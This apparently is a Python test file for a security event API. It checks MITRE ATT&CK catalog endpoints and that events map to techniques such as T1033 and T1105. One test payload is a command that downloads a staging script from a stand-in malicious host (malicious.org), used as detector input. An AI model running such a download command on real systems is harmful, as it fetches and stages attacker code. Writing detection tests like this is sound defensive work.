def test_mitre_catalog_and_matrix_endpoints(client):
    """Verify MITRE catalog listing and legacy matrix status endpoints."""
    # /api/techniques
    res_tech = client.get("/api/techniques")
    assert res_tech.status_code == 200
    techs = res_tech.json()
    assert len(techs) >= 10
    tech_ids = [t["technique_id"] for t in techs]
    assert "T1033" in tech_ids
    assert "T1105" in tech_ids

    # /api/v1/mitre/matrix
    res_mat = client.get("/api/v1/mitre/matrix")
    assert res_mat.status_code == 200
    assert len(res_mat.json()) >= 10

def test_evidence_backed_mapping_heuristics(client):
    """Verify that actual evidence maps to correct technique, while generic events remain unmapped."""
    # 1. whoami command -> T1033
    res_whoami = client.post("/api/events", json={
        "event_id": "evt-mitre-whoami-iso",
        "source_ip": "198.51.100.44",
        "event_type": "command_execution",
        "payload": "whoami"
    })
    assert res_whoami.status_code == 201
    assert res_whoami.json()["mitre_technique_id"] == "T1033"

    # 2. curl staging -> T1105
    res_curl = client.post("/api/events", json={
        "event_id": "evt-mitre-curl-iso",
        "source_ip": "198.51.100.44",
        "event_type": "command_execution",
        "payload": "curl -O http://malicious.org/stage.sh"
    })
    assert res_curl.status_code == 201
    assert res_curl.json()["mitre_technique_id"] == "T1105"

    # 3. Generic ping without evidence -> None
    res_ping = client.post("/api/events", json={
        "event_id": "evt-mitre-ping-iso",
        "source_ip": "198.51.100.44",
        "event_type": "ping",
        "payload": "ICMP echo request"
    })
    assert res_ping.status_code == 201
    assert res_ping.json()["mitre_technique_id"] is None
